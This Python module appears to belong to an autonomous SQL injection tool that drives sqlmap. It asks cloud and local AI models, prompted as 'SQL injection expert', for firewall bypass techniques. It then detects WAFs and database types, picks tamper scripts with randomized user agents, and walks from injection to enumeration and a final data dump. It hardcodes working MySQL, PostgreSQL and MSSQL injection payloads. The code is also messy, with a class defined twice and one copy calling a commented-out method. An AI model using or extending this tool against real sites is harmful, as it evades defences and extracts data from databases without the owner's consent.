

def _utf8_env() -> dict:
    # forces UTF-8 for child process IO  
    env = dict(os.environ)
    env["PYTHONIOENCODING"] = "utf-8"
    env["PYTHONUTF8"] = "1"
    return env

"""Autonomous AI with Cloud API Support and Real-World Bypass Intelligence"""
import subprocess
import json
import os
import re
import asyncio
import aiohttp
from typing import List, Dict, Any, Optional
from datetime import datetime

from core.waf_intel import waf_intel
from core.rag_memory import rag_memory
from core.debug_logger import logger
import config
from enum import Enum   

from typing import List, Dict, Any, Optional


class AIProviderStatus(Enum):
    # AI Provider health status 
    HEALTHY = "healthy"
    DEGRADED = "degraded"
    DOWN = "down"
    UNKNOWN = "unknown"

class DynamicCloudAIManager:
    # Dynamic AI provider management with health checking 
    
    PROVIDERS = {
        'ollama': {
            'local': True,
            'health_url': 'http://localhost:11434/api/tags',
            'priority': 1,
            'timeout': 10
        },
        'deepseek': {
            'local': False,
            'api_url': 'https://api.deepseek.com/v1/chat/completions',
            'env_key': 'DEEPSEEK_API_KEY',
            'priority': 2,
            'timeout': 30
        },
        'kimi': {
            'local': False,
            'api_url': 'https://api.moonshot.cn/v1/chat/completions',
            'env_key': 'KIMI_API_KEY',
            'priority': 3,
            'timeout': 30
        },
        'groq': {
            'local': False,
            'api_url': 'https://api.groq.com/openai/v1/chat/completions',
            'env_key': 'GROQ_API_KEY',
            'priority': 4,
            'timeout': 20
        },
        'openai': {
            'local': False,
            'api_url': 'https://api.openai.com/v1/chat/completions',
            'env_key': 'OPENAI_API_KEY',
            'priority': 5,
            'timeout': 30
        },
        'claude': {
            'local': False,
            'api_url': 'https://api.anthropic.com/v1/messages',
            'env_key': 'ANTHROPIC_API_KEY',
            'priority': 6,
            'timeout': 30
        }
    }
    
    def __init__(self):
        self.provider_status: Dict[str, AIProviderStatus] = {
            name: AIProviderStatus.UNKNOWN for name in self.PROVIDERS
        }
        self.last_health_check: Dict[str, datetime] = {}
        self.error_counts: Dict[str, int] = {name: 0 for name in self.PROVIDERS}
        self.health_check_interval = 60  # seconds
        
    async def health_check(self, provider: str) -> AIProviderStatus:
        # Check health of a provider 
        config = self.PROVIDERS[provider]
        
        try:
            if config['local']:
                # Check Ollama
                async with aiohttp.ClientSession() as session:
                    async with session.get(
                        config['health_url'], 
                        timeout=aiohttp.ClientTimeout(total=config['timeout'])
                    ) as resp:
                        if resp.status == 200:
                            return AIProviderStatus.HEALTHY
                        return AIProviderStatus.DEGRADED
            else:
                # Check cloud provider by testing API key
                key = os.getenv(config['env_key'])
                if not key:
                    return AIProviderStatus.DOWN
                
                # Simple connectivity test
                async with aiohttp.ClientSession() as session:
                    async with session.get(
                        config['api_url'].replace('/chat/completions', ''),
                        timeout=aiohttp.ClientTimeout(total=config['timeout'])
                    ) as resp:
                        # Any response means service is up
                        return AIProviderStatus.HEALTHY
                        
        except Exception as e:
            logger.debug("AI", f"Health check failed for {provider}: {e}")
            return AIProviderStatus.DOWN
    
    async def check_all_providers(self):
        # Check all providers concurrently 
        tasks = [
            self._check_provider(name) 
            for name in self.PROVIDERS
        ]
        await asyncio.gather(*tasks, return_exceptions=True)
        
        healthy = [k for k, v in self.provider_status.items() 
                  if v == AIProviderStatus.HEALTHY]
        logger.info("AI", f"Provider health check complete: {healthy}")
    
    async def _check_provider(self, name: str):
        # Check single provider 
        status = await self.health_check(name)
        self.provider_status[name] = status
        self.last_health_check[name] = datetime.now()
    
    def get_best_provider(self) -> Optional[str]:
        # Get best available provider based on priority and health 
        # Sort by priority
        sorted_providers = sorted(
            self.PROVIDERS.items(),
            key=lambda x: x[1]['priority']
        )
        
        for name, config in sorted_providers:
            if self.provider_status[name] == AIProviderStatus.HEALTHY:
                return name
        
        return None
    
    async def query_with_failover(self, prompt: str, timeout: int = 60) -> Optional[str]:
        # Query AI with automatic failover 
        # health check is recent
        if not self.last_health_check:
            await self.check_all_providers()
        
        provider = self.get_best_provider()
        
        if not provider:
            logger.error("AI", "No healthy AI providers available")
            return None
        
        try:
            result = await self._query_provider(provider, prompt, timeout)
            if result:
                return result
        except Exception as e:
            logger.warning("AI", f"{provider} failed: {e}")
            self.error_counts[provider] += 1
            self.provider_status[provider] = AIProviderStatus.DEGRADED
        
        # Try next provider
        for name in self.PROVIDERS:
            if name != provider and self.provider_status[name] == AIProviderStatus.HEALTHY:
                try:
                    result = await self._query_provider(name, prompt, timeout)
                    if result:
                        logger.info("AI", f"Failover to {name} successful")
                        return result
                except Exception as e:
                    logger.warning("AI", f"Failover to {name} failed: {e}")
                    continue
        
        return None
    
    async def _query_provider(self, name: str, prompt: str, timeout: int) -> Optional[str]:
        # Query specific provider 
        config = self.PROVIDERS[name]
        
        if config['local']:
            return await self._query_ollama(prompt, timeout)
        else:
            return await self._query_cloud(name, config, prompt, timeout)
    
    async def _query_ollama(self, prompt: str, timeout: int) -> Optional[str]:
        # Query local Ollama 
        model_key = (os.getenv("OLLAMA_MODEL") or "default").strip()
        model_name = config.OLLAMA_MODELS.get(model_key, model_key)  # map key -> real model
        try:
            async with aiohttp.ClientSession() as session:
                payload = {
                    'model': model_name,
                    'prompt': prompt,
                    'stream': False,
                    'options': {'temperature': 0.3}
                }
                
                async with session.post(
                    'http://localhost:11434/api/generate',
                    json=payload,
                    timeout=aiohttp.ClientTimeout(total=timeout)
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        return data.get('response', '')
                    return None
        except Exception as e:
            logger.error("AI", f"Ollama query failed: {e}")
            return None
    
    async def _query_cloud(self, name: str, config: Dict, prompt: str, 
                          timeout: int) -> Optional[str]:
        # Query cloud provider 
        key = os.getenv(config['env_key'])
        if not key:
            return None
        
        headers = {
            'Authorization': f'Bearer {key}',
            'Content-Type': 'application/json'
        }
        
        payload = {
            'model': self._get_model(name),
            'messages': [
                {'role': 'system', 'content': 'You are a SQL injection expert. Be concise.'},
                {'role': 'user', 'content': prompt}
            ],
            'max_tokens': 2000,
            'temperature': 0.3
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    config['api_url'],
                    headers=headers,
                    json=payload,
                    timeout=aiohttp.ClientTimeout(total=timeout)
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        return self._extract_response(name, data)
                    return None
        except Exception as e:
            logger.error("AI", f"{name} query failed: {e}")
            return None
    
    def _get_model(self, provider: str) -> str:
        # Get model name for provider"""
        models = {
            'deepseek': 'deepseek-coder',
            'kimi': 'kimi-latest',
            'groq': 'llama-3.3-70b-versatile',
            'openai': 'gpt-4o',
            'claude': 'claude-3-5-sonnet-20241022'
        }
        return models.get(provider, 'gpt-4')
    
    def _extract_response(self, provider: str, data: Dict) -> str:
        # Extract response from provider-specific format 
        if provider == 'claude':
            return data.get('content', [{}])[0].get('text', '')
        return data.get('choices', [{}])[0].get('message', {}).get('content', '')
    
class CloudAIManager:
    # Manage multiple cloud AI providers with failover 
    
    def __init__(self):
        self.providers = config.CLOUD_AI_CONFIG
        self.available_providers = []
        self._check_available_providers()
        
    # def _check_available_providers(self):
    #      
        
    #     for provider_id, cfg in self.providers.items():
    #         api_key = os.getenv(cfg['api_key_env'])
    #         if api_key:
    #             cfg['enabled'] = True
    #             cfg['api_key'] = api_key
    #             self.available_providers.append(provider_id)
    #             logger.info("AI", f"Cloud provider available: {cfg['name']}")

    def _check_available_providers(self):
        # Check which providers have API keys configured 
        # HARD SWITCH: disable cloud AI completely
        if not getattr(config, "CLOUD_AI_ENABLED", True):
            logger.warning("AI", "Cloud AI disabled (CLOUD_AI_ENABLED=0)")
            self.available_providers = []
            return

        for provider_id, cfg in self.providers.items():
            api_key = os.getenv(cfg['api_key_env'])
            if api_key:
                cfg['enabled'] = True
                cfg['api_key'] = api_key
                self.available_providers.append(provider_id)
                logger.info("AI", f"Cloud provider available: {cfg['name']}")
        
        if not self.available_providers:
            logger.warning("AI", "No cloud AI providers configured")
    
    async def query(self, prompt: str, provider: str = None, timeout: int = 60) -> Optional[str]:
        # Query AI with automatic failover 
        if provider and provider in self.available_providers:
            return await self._query_provider(provider, prompt, timeout)
        
        # Try all available providers in priority order
        for prov in config.AI_PRIORITY:
            if prov == 'ollama':
                continue  # Handled separately
            if prov in self.available_providers:
                result = await self._query_provider(prov, prompt, timeout)
                if result:
                    return result
        
        return None
    
    async def _query_provider(self, provider: str, prompt: str, timeout: int) -> Optional[str]:
        """Query specific provider"""
        cfg = self.providers[provider]
        
        try:
            if provider == 'claude':
                return await self._query_claude(cfg, prompt, timeout)
            else:
                return await self._query_openai_compatible(cfg, prompt, timeout)
        except Exception as e:
            logger.error("AI", f"{provider} query failed: {e}")
            return None
    
    async def _query_openai_compatible(self, cfg: Dict, prompt: str, timeout: int) -> Optional[str]:
        # Query OpenAI-compatible API 
        headers = {
            'Authorization': f"Bearer {cfg['api_key']}",
            'Content-Type': 'application/json'
        }
        
        payload = {
            'model': cfg['model'],
            'messages': [
                {'role': 'system', 'content': 'You are a SQL injection expert. Provide concise, actionable bypass techniques.'},
                {'role': 'user', 'content': prompt}
            ],
            'max_tokens': cfg['max_tokens'],
            'temperature': 0.3
        }
        
        async with aiohttp.ClientSession() as session:
            async with session.post(
                cfg['api_url'],
                headers=headers,
                json=payload,
                timeout=aiohttp.ClientTimeout(total=timeout)
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    return data['choices'][0]['message']['content']
                else:
                    logger.error("AI", f"API error {response.status}")
                    return None
    
    async def _query_claude(self, cfg: Dict, prompt: str, timeout: int) -> Optional[str]:
        # Query Claude API 
        headers = {
            'x-api-key': cfg['api_key'],
            'Content-Type': 'application/json',
            'anthropic-version': '2023-06-01'
        }
        
        payload = {
            'model': cfg['model'],
            'max_tokens': cfg['max_tokens'],
            'messages': [
                {'role': 'user', 'content': prompt}
            ]
        }
        
        async with aiohttp.ClientSession() as session:
            async with session.post(
                cfg['api_url'],
                headers=headers,
                json=payload,
                timeout=aiohttp.ClientTimeout(total=timeout)
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    return data['content'][0]['text']
                else:
                    logger.error("AI", f"Claude API error {response.status}")
                    return None
    
    def get_best_provider(self) -> Optional[str]:
        # Get the best available provider 
        for prov in config.AI_PRIORITY:
            if prov in self.available_providers:
                return prov
        return None

class OllamaAI:
    # Local Ollama AI integration 
    
    def __init__(self):
        # self.enabled = True
        self.enabled = getattr(config, "OLLAMA_ENABLED", True)
        self.model = config.OLLAMA_MODELS['default']
        self.available = False
        self._check_status()
        
    
    def _check_status(self):
        # Check if Ollama is available
  

        if not self.enabled:
            self.available = False
            return
        try:
            env = _utf8_env()
            result = subprocess.run(
                ["ollama", "list"],
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
                env=env,
                timeout=5
            )
            self.available = result.returncode == 0 and self.model in result.stdout
            if self.available:
                logger.success("AI", f"Ollama ready: {self.model}")
        except Exception as e:
            self.available = False
    
    def ask(self, prompt: str, timeout: int = 60) -> Optional[str]:
        # Query Ollama
        
        if not self.available:
            return None
        
        
        try:
            env = _utf8_env()
            proc = subprocess.Popen(
                ["ollama", "run", self.model],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                encoding="utf-8",
                errors="replace",
                env=env,
            )
            stdout, _ = proc.communicate(input=prompt, timeout=timeout)
            return stdout.strip() if proc.returncode == 0 else None
        except Exception as e:
            logger.error("AI", f"Ollama error: {e}")
            return None

class SmartBypassEngine:
    # Real-world SQL injection bypass engine 
    
    def __init__(self):
        self.waf_patterns = config.WAF_PATTERNS
        self.real_world_bypasses = config.REAL_WORLD_BYPASSES
        self.tamper_scripts = config.TAMPER_SCRIPTS
        self.technique_priority = config.TECHNIQUE_PRIORITY
        self.detection_patterns = config.DETECTION_PATTERNS
        
    def analyze_logs_for_waf(self, logs: List[str]) -> Optional[Dict]:
        #  WAF detection with confidence scoring
        text = '\\n'.join(logs).lower()
        detections = []
        
        for waf_type, data in self.waf_patterns.items():
            score = 0
            matched_patterns = []
            
            for pattern in data['patterns']:
                if pattern.lower() in text:
                    score += 1
                    matched_patterns.append(pattern)
            
            if score > 0:
                confidence = min(1.0, score / len(data['patterns']) + 0.2)
                detections.append({
                    'waf_type': waf_type,
                    'confidence': confidence,
                    'patterns': matched_patterns,
                    'data': data
                })
        
        if detections:
            # Return highest confidence detection
            best = max(detections, key=lambda x: x['confidence'])
            return {
                'detected': True,
                'waf_type': best['waf_type'],
                'confidence': best['confidence'],
                'tampers': best['data']['tampers'],
                'techniques': best['data']['techniques'],
                'recommendation': best['data']['recommendation']
            }
        
        return None
    
    def get_real_world_bypass(self, waf_type: str, attempt: int = 0) -> Dict:
        # Get real-world bypass technique 
        if waf_type in self.real_world_bypasses:
            techniques = self.real_world_bypasses[waf_type]['techniques']
            if attempt < len(techniques):
                tech = techniques[attempt]
                return {
                    'name': tech['name'],
                    'tamper': tech['tamper'],
                    'delay': tech.get('delay', 2),
                    'threads': int(tech.get('threads', 3)),
                    'headers': self.real_world_bypasses[waf_type].get('headers', {}),
                    'technique': 'time-based blind' if 'time' in tech['name'].lower() else 'boolean-based blind'
                }
        
        # Fallback to generic
        return {
            'name': f'Generic Bypass #{attempt}',
            'tamper': ','.join(self.tamper_scripts['basic']),
            'delay': 3,
            'threads': 2,
            'headers': {},
            'technique': 'boolean-based blind'
        }
    
    def detect_dbms_from_logs(self, logs: List[str]) -> Optional[str]:
        # Detect DBMS type from error messages 
        text = '\\n'.join(logs).lower()
        
        for dbms, patterns in self.detection_patterns.items():
            for signature in patterns['error_signatures']:
                if signature.lower() in text:
                    return dbms
        
        return None
    
    def generate_smart_payload(self, dbms: str, technique: str, waf: str = None) -> str:
        # Generate context-aware SQL injection payload 
        payloads = {
            'mysql': {
                'error_based': ["' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--", "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)--"],
                'union_based': ["' UNION SELECT NULL,CONCAT(0x7e,@@version,0x7e),NULL--", "' UNION SELECT NULL,database(),NULL--"],
                'blind_time': ["' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>64,SLEEP(5),0)--", "' AND SLEEP(5)--"]
            },
            'postgresql': {
                'error_based': ["' AND 1=CAST((SELECT version()) AS INTEGER)--", "' AND 1=cast('a'||version() as integer)--"],
                'union_based': ["' UNION SELECT NULL,version(),NULL--", "' UNION SELECT NULL,current_database(),NULL--"],
                'blind_time': ["' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT current_database()),1,1))>64) THEN pg_sleep(5) ELSE pg_sleep(0) END)--"]
            },
            'mssql': {
                'error_based': ["' AND 1=@@version--", "' AND 1=(SELECT @@version)--"],
                'union_based': ["' UNION SELECT NULL,@@version,NULL--", "' UNION SELECT NULL,DB_NAME(),NULL--"],
                'blind_time': ["'; WAITFOR DELAY '0:0:5'--", "' IF (ASCII(SUBSTRING((SELECT DB_NAME()),1,1))>64) WAITFOR DELAY '0:0:5'--"]
            }
        }
        
        if dbms in payloads and technique in payloads[dbms]:
            return payloads[dbms][technique][0]
        
        return "' OR '1'='1"

class UpgradedAutonomousAI:
    """Upgraded AI with cloud support and real-world intelligence"""
    
    def __init__(self):
        self.waf_intel = waf_intel
        self.bypass_engine = SmartBypassEngine()
        self.cloud_ai = CloudAIManager()
        self.ollama = OllamaAI()
        
        self.current_waf = None
        self.waf_confidence = 0.0
        self.bypass_attempts = 0
        self.max_bypass_attempts = 5
        
        self.learning_patterns = []
        self.successful_techniques = []
        
        # Load historical patterns from RAG
        self._load_historical_patterns()
    
    def _load_historical_patterns(self):
        """Load historical patterns from RAG memory"""
        try:
            if rag_memory and hasattr(rag_memory, 'memory'):
                patterns = rag_memory.memory.get('bypass_patterns', [])
                self.successful_techniques = [
                    p for p in patterns if p.get('success')
                ]
                logger.info("AI", f"Loaded {len(self.successful_techniques)} historical patterns")
        except Exception as e:
            logger.debug("AI", f"Failed to load historical patterns: {e}")
        
        logger.info("AI", "Upgraded Autonomous AI initialized")
        logger.info("AI", f"Available providers: {self.cloud_ai.available_providers or ['Ollama only']}")
    
    async def smart_analyze(self, logs: List[str], results: Dict, cycle: int,
                          target_url: str, method: str = "GET", 
                          post_data: str = "", headers: str = "") -> Dict:
        """Smart analysis with real-world bypass recommendations"""
        
        # Detect WAF with confidence
        waf_detection = self.bypass_engine.analyze_logs_for_waf(logs)
        if waf_detection:
            self.current_waf = waf_detection['waf_type']
            self.waf_confidence = waf_detection['confidence']
            logger.info("AI", f"WAF detected: {self.current_waf} ({self.waf_confidence:.0%} confidence)")

            # Store successful detection in RAG
            await self.store_successful_bypass(
                waf_type=waf_detection['waf_type'],
                technique='detection',
                tamper=','.join(waf_detection.get('tampers', [])),
                success=True
            )
        # Detect DBMS
        dbms = self.bypass_engine.detect_dbms_from_logs(logs)
        if dbms:
            logger.info("AI", f"DBMS detected: {dbms}")
        
        # Get AI recommendation
        ai_rec = await self._get_ai_recommendation(logs, waf_detection, dbms, target_url)
        
        # Determine action based on state
        action = self._determine_action(results, cycle)
        
        # Build command modifications
        cmd_mods = await self._build_smart_modifications(
            action, waf_detection, dbms, ai_rec, cycle
        )
        
        return {
            'action': action,
            'reason': self._build_reason(action, waf_detection, dbms, ai_rec),
            'waf_detected': waf_detection,
            'dbms': dbms,
            'command_modifications': cmd_mods,
            'ai_recommendation': ai_rec,
            'cycle': cycle,
            'confidence': self._calculate_confidence(waf_detection, ai_rec)
        }
    
#     async def _get_ai_recommendation(self, logs: List[str], waf: Dict, 
#                                     dbms: str, target: str) -> Dict:
#         """Get AI recommendation from best available provider"""
        
#         prompt = f"""Analyze this SQL injection scenario and recommend bypass technique.

# Target: {target}
# WAF: {waf['waf_type'] if waf else 'Unknown'} (confidence: {waf['confidence'] if waf else 0:.0%})
# DBMS: {dbms or 'Unknown'}

# Recent logs:
# {chr(10).join(logs[-30:])}

# Respond in JSON format:
# {{
#     "technique": "error-based|union|boolean-blind|time-blind",
#     "tamper_scripts": ["script1", "script2"],
#     "delay": 2,
#     "threads": 3,
#     "custom_payload": "specific SQL payload if applicable",
#     "headers": {{"User-Agent": "value"}},
#     "reason": "explanation",
#     "confidence": 0.8
# }}"""
        
#         # Try cloud AI first
#         response = None
#         provider_used = None
        
#         if self.cloud_ai.available_providers:
#             provider = self.cloud_ai.get_best_provider()
#             if provider:
#                 response = await self.cloud_ai.query(prompt, provider)
#                 if response:
#                     provider_used = provider
#                     logger.success("AI", f"Recommendation from {provider}")
        
#         # Fallback to Ollama
#         if not response and self.ollama.available:
#             response = self.ollama.ask(prompt)
#             if response:
#                 provider_used = 'ollama'
        
#         if response:
#             try:
#                 # Extract JSON
#                 json_match = re.search(r'```json\\s*(\\{.*?\\})\\s*```', response, re.DOTALL)
#                 if json_match:
#                     response = json_match.group(1)
                
#                 result = json.loads(response)
#                 result['provider'] = provider_used
#                 return result
#             except json.JSONDecodeError:
#                 logger.warning("AI", "Failed to parse AI response as JSON")
        
#         # Fallback to rule-based
#         return self._fallback_recommendation(waf, dbms)
    
    def _fallback_recommendation(self, waf: Dict, dbms: str) -> Dict:
        """Rule-based fallback when AI unavailable"""
        if waf:
            bypass = self.bypass_engine.get_real_world_bypass(waf['waf_type'], self.bypass_attempts)
            return {
                'technique': bypass['technique'],
                'tamper_scripts': bypass['tamper'].split(','),
                'delay': bypass['delay'],
                # 'threads': bypass['threads'],
                'reason': f"Real-world {waf['waf_type']} bypass technique",
                'confidence': 0.7,
                'provider': 'rule-based'
            }
        
        return {
            'technique': 'boolean-blind',
            'tamper_scripts': ['space2comment', 'between'],
            'delay': 2,
            # 'threads': 3,
            'reason': 'Default blind technique',
            'confidence': 0.5,
            'provider': 'rule-based'
        }
    
    async def _build_smart_modifications(self, action: str, waf: Dict, 
                                        dbms: str, ai_rec: Dict, cycle: int) -> List[str]:
        # Build intelligent command modifications 
        mods = []
        
        # Apply AI recommendations
        if ai_rec:
            if ai_rec.get('tamper_scripts'):
                mods.extend(['--tamper', ','.join(ai_rec['tamper_scripts'][:3])])
            
            if ai_rec.get('delay'):
                mods.extend(['--delay', str(ai_rec['delay'])])
            
            # if ai_rec.get('threads'):
            #     mods.extend(['--threads', str(ai_rec['threads'])])
            
            if ai_rec.get('technique'):
                tech_map = {
                    'error-based': 'E',
                    'union': 'U',
                    'boolean-blind': 'B',
                    'time-blind': 'T'
                }
                mods.extend(['--technique', tech_map.get(ai_rec['technique'], 'BEUSTQ')])
        
        # Apply WAF-specific bypass
        elif waf and self.bypass_attempts < self.max_bypass_attempts:
            # Try RAG memory first
            historical = self.get_historical_bypasses(waf['waf_type'])
            if historical and historical[0].get('success'):
                # Use successful pattern from memory
                bypass = {
                    'tamper': historical[0]['tamper'],
                    'delay': 3,
                    # 'threads': 2,
                    'technique': historical[0]['technique']
                }
                logger.info("AI", f"Using historical bypass for {waf['waf_type']}")
            else:
                # Use real-world bypass
                bypass = self.bypass_engine.get_real_world_bypass(
                    waf['waf_type'], self.bypass_attempts
                )
            mods.extend(['--tamper', bypass['tamper']])
            mods.extend(['--delay', str(bypass['delay'])])
            # mods.extend(['--threads', str(bypass['threads'])])
            
            # Add custom headers if specified
            if bypass.get('headers'):
                for header, value in bypass['headers'].items():
                    mods.extend(['--header', f"{header}: {value}"])
            
            self.bypass_attempts += 1
        
        # Always add random agent
        mods.append('--random-agent')
        
        # Add level/risk based on cycle
        if cycle > 3:
            mods.extend(['--level', str(min(cycle, 5))])
            mods.extend(['--risk', '2'])
        
        return mods
    
    def _determine_action(self, results: Dict, cycle: int) -> str:
         
        # Determine next action based on current results"""
        if not results.get('injection_found'):
            if self.current_waf and self.bypass_attempts < self.max_bypass_attempts:
                return 'bypass_waf'
            return 'detect_injection'
        
        if not results.get('databases'):
            return 'enumerate_dbs'
        
        if not results.get('tables'):
            return 'enumerate_tables'
        
        if not results.get('columns'):
            return 'enumerate_columns'
        
        return 'smart_dump'
    
    def _build_reason(self, action: str, waf: Dict, dbms: str, ai_rec: Dict) -> str:
        # Build human-readable reason"""
        parts = [f"Action: {action}"]
        
        if waf:
            parts.append(f"WAF: {waf['waf_type']} ({waf['confidence']:.0%})")
        
        if dbms:
            parts.append(f"DBMS: {dbms}")
        
        if ai_rec:
            parts.append(f"AI: {ai_rec.get('reason', 'No explanation')[:50]}")
            parts.append(f"Provider: {ai_rec.get('provider', 'unknown')}")
        
        return " | ".join(parts)
    
    def _calculate_confidence(self, waf: Dict, ai_rec: Dict) -> float:
        # Calculate overall confidence score 
        confidence = 0.5
        
        if waf:
            confidence += waf['confidence'] * 0.3
        
        if ai_rec:
            confidence += ai_rec.get('confidence', 0.5) * 0.2
        
        return min(1.0, confidence)
    


    def reset_bypass_attempts(self):
        # Reset bypass attempt counter
        self.bypass_attempts = 0
        self.current_waf = None
        self.waf_confidence = 0.0
    
    async def store_successful_bypass(self, waf_type: str, technique: str, tamper: str, success: bool = True):
        # Store successful bypass pattern in RAG memory 
        try:
            bypass_data = {
                'waf_type': waf_type,
                'technique': technique,
                'tamper': tamper,
                'success': success,
                'timestamp': datetime.now().isoformat()
            }
            # Store in RAG if available
            if rag_memory and hasattr(rag_memory, 'memory'):
                if 'bypass_patterns' not in rag_memory.memory:
                    rag_memory.memory['bypass_patterns'] = []
                rag_memory.memory['bypass_patterns'].append(bypass_data)
                logger.info("AI", f"Stored bypass pattern for {waf_type}")
        except Exception as e:
            logger.debug("AI", f"Failed to store bypass pattern: {e}")
    
    def get_historical_bypasses(self, waf_type: str, limit: int = 5) -> List[Dict]:
        # Get historical bypass patterns for WAF type from RAG 
        try:
            if not rag_memory or not hasattr(rag_memory, 'memory'):
                return []
            
            patterns = rag_memory.memory.get('bypass_patterns', [])
            # Filter by WAF type and sort by success
            matching = [p for p in patterns if p.get('waf_type') == waf_type]
            matching.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
            return matching[:limit]
        except Exception as e:
            logger.debug("AI", f"Failed to get historical bypasses: {e}")
            return []



class UpgradedAutonomousAI:
    # Upgraded AI with cloud support and real-world intelligence 
    
    def __init__(self):
        self.waf_intel = waf_intel
        self.bypass_engine = SmartBypassEngine()
        self.cloud_ai = CloudAIManager()
        self.ollama = OllamaAI()
        
        self.current_waf = None
        self.waf_confidence = 0.0
        self.bypass_attempts = 0
        self.max_bypass_attempts = 5
        
        self.learning_patterns = []
        self.successful_techniques = []
        
        logger.info("AI", "Upgraded Autonomous AI initialized")
        logger.info("AI", f"Available providers: {self.cloud_ai.available_providers or ['Ollama only']}")
    
    async def smart_analyze(self, logs: List[str], results: Dict, cycle: int,
                          target_url: str, method: str = "GET", 
                          post_data: str = "", headers: str = "",
                          phase: str = "detection", context: Any = None) -> Dict:
        # Smart analysis with real-world bypass recommendations 
        
        # Detect WAF with confidence
        waf_detection = self.bypass_engine.analyze_logs_for_waf(logs)
        if waf_detection:
            self.current_waf = waf_detection['waf_type']
            self.waf_confidence = waf_detection['confidence']
            logger.info("AI", f"WAF detected: {self.current_waf} ({self.waf_confidence:.0%} confidence)")
        
        # Detect DBMS
        dbms = self.bypass_engine.detect_dbms_from_logs(logs)
        if dbms:
            logger.info("AI", f"DBMS detected: {dbms}")
        
        # Get AI recommendation
        ai_rec = await self._get_ai_recommendation(logs, waf_detection, dbms, target_url)
        
        # Determine action based on state
        action = self._determine_action(results, cycle)
        
        # Build command modifications
        cmd_mods = await self._build_smart_modifications(
            action, waf_detection, dbms, ai_rec, cycle
        )
        
        return {
            'action': action,
            'reason': self._build_reason(action, waf_detection, dbms, ai_rec),
            'waf_detected': waf_detection,
            'dbms': dbms,
            'command_modifications': cmd_mods,
            'ai_recommendation': ai_rec,
            'cycle': cycle,
            'confidence': self._calculate_confidence(waf_detection, ai_rec)
        }
    

    
    async def _get_ai_recommendation(self, logs: List[str], waf: Dict, 
                                    dbms: str, target: str) -> Dict:
        """Get AI recommendation from best available provider"""
        
        prompt = f"""Analyze this SQL injection scenario and recommend bypass technique.

Target: {target}
WAF: {waf['waf_type'] if waf else 'Unknown'} (confidence: {waf['confidence'] if waf else 0:.0%})
DBMS: {dbms or 'Unknown'}

Recent logs:
{chr(10).join(logs[-30:])}

Respond in JSON format:
{{
    "technique": "error-based|union|boolean-blind|time-blind",
    "tamper_scripts": ["script1", "script2"],
    "delay": 2,
    "custom_payload": "specific SQL payload if applicable",
    "headers": {{"User-Agent": "value"}},
    "reason": "explanation",
    "confidence": 0.8
}}"""
        
        # Try cloud AI first
        response = None
        provider_used = None
        
        if self.cloud_ai.available_providers:
            provider = self.cloud_ai.get_best_provider()
            if provider:
                response = await self.cloud_ai.query(prompt, provider)
                if response:
                    provider_used = provider
                    logger.success("AI", f"Recommendation from {provider}")
        
        # Fallback to Ollama
        if not response and self.ollama.available:
            response = self.ollama.ask(prompt)
            if response:
                provider_used = 'ollama'
        
        if response:
            try:
                # Extract JSON
                json_match = re.search(r'```json\s*(\{.*?\})\s*```', response, re.DOTALL)
                if json_match:
                    response = json_match.group(1)
                
                result = json.loads(response)
                result['provider'] = provider_used
                return result
            except json.JSONDecodeError:
                pass 
                # logger.warning("AI", "Failed to parse AI response as JSON")
        
        # Fallback to rule-based
        return self._fallback_recommendation(waf, dbms)
    
    def _fallback_recommendation(self, waf: Dict, dbms: str) -> Dict:
        """Rule-based fallback when AI unavailable"""
        if waf:
            bypass = self.bypass_engine.get_real_world_bypass(waf['waf_type'], self.bypass_attempts)
            return {
                'technique': bypass['technique'],
                'tamper_scripts': bypass['tamper'].split(','),
                'delay': bypass['delay'],
                # 'threads': bypass['threads'],
                'reason': f"Real-world {waf['waf_type']} bypass technique",
                'confidence': 0.7,
                'provider': 'rule-based'
            }
        
        return {
            'technique': 'boolean-blind',
            'tamper_scripts': ['space2comment', 'between'],
            'delay': 2,
            # 'threads': 3,
            'reason': 'Default blind technique',
            'confidence': 0.5,
            'provider': 'rule-based'
        }
    
    
    async def _build_smart_modifications(self, action: str, waf: Dict, 
                                        dbms: str, ai_rec: Dict, cycle: int) -> List[str]:
        """Build intelligent command modifications"""
        mods = []
        
        # Apply AI recommendations
        if ai_rec:
            if ai_rec.get('tamper_scripts'):
                mods.extend(['--tamper', ','.join(ai_rec['tamper_scripts'][:3])])
            
            if ai_rec.get('delay'):
                mods.extend(['--delay', str(ai_rec['delay'])])
            
            # if ai_rec.get('threads'):
            #     mods.extend(['--threads', str(ai_rec['threads'])])
            
            if ai_rec.get('technique'):
                tech_map = {
                    'error-based': 'E',
                    'union': 'U',
                    'boolean-blind': 'B',
                    'time-blind': 'T'
                }
                mods.extend(['--technique', tech_map.get(ai_rec['technique'], 'BEUSTQ')])
        
        # Apply WAF-specific bypass
        elif waf and self.bypass_attempts < self.max_bypass_attempts:
            bypass = self.bypass_engine.get_real_world_bypass(
                waf['waf_type'], self.bypass_attempts
            )
            mods.extend(['--tamper', bypass['tamper']])
            mods.extend(['--delay', str(bypass['delay'])])
            # mods.extend(['--threads', str(bypass['threads'])])
            
            # Add custom headers if specified
            if bypass.get('headers'):
                for header, value in bypass['headers'].items():
                    mods.extend(['--header', f"{header}: {value}"])
            
            self.bypass_attempts += 1
        
        # Always add random agent
        mods.append('--random-agent')
        
        # Add level/risk based on cycle
        if cycle > 3:
            mods.extend(['--level', str(min(cycle, 5))])
            mods.extend(['--risk', '2'])
        
        return mods
    
    def _determine_action(self, results: Dict, cycle: int) -> str:
        """Determine next action based on current results"""
        if not results.get('injection_found'):
            if self.current_waf and self.bypass_attempts < self.max_bypass_attempts:
                return 'bypass_waf'
            return 'detect_injection'
        
        if not results.get('databases'):
            return 'enumerate_dbs'
        
        if not results.get('tables'):
            return 'enumerate_tables'
        
        if not results.get('columns'):
            return 'enumerate_columns'
        
        return 'smart_dump'
    
